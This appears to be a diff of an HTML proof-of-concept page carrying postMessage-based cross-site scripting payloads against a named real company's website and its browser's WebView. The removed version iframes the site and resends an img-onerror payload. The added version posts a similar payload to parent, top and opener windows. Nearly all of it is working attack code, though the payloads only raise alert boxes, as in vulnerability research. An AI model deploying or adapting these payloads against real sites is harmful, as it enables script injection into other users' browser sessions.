@@ -1,38 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🔥 Final XSS PoC - thebrowser.company</title>
+  <meta charset="utf-8">
+  <title>🔥 Arc WebView Exploit</title>
 </head>
 <body>
-  <h2>🔥 DOM XSS PoC - External Execution</h2>
-  <p>✅ This page will trigger <code>alert(1)</code> inside <code>https://thebrowser.company</code> automatically.</p>
-
-  <iframe id="target" src="https://thebrowser.company" width="100%" height="600" style="border:2px solid black;"></iframe>
+  <h2>🚀 Arc WebView XSS via postMessage</h2>
+  <p>If this page is opened inside Arc WebView, it will trigger an XSS.</p>
 
   <script>
-    const iframe = document.getElementById("target");
-
-    // بايلود XSS
     const payload = {
-      message: "OB_SHOULD_SHOW_PICKER",
-      content: {
-        marketerId: `<img src='x' onerror='alert(1)'>`
-      }
+      type: "arc_webview_init",
+      html: `<img src=x onerror=alert('🔥 WebView XSS in Arc')>`
     };
 
-    // بعد تحميل iframe نرسل البايلود
-    iframe.onload = () => {
-      console.log("✅ iframe loaded");
-
-      // إرسال البايلود مباشرة
-      iframe.contentWindow.postMessage(payload, "*");
-
-      // محاولة خداع React بإرسال البايلود مرة أخرى بعد 3 ثوانٍ
-      setTimeout(() => {
-        console.log("🚀 Re-sending payload...");
-        iframe.contentWindow.postMessage(payload, "*");
-      }, 3000);
-    };
+    setTimeout(() => {
+      window.parent.postMessage(payload, "*");
+      window.top.postMessage(payload, "*");
+      window.opener?.postMessage(payload, "*");
+      console.log("🚀 postMessage sent to Arc WebView");
+    }, 2000);
   </script>
 </body>
 </html>
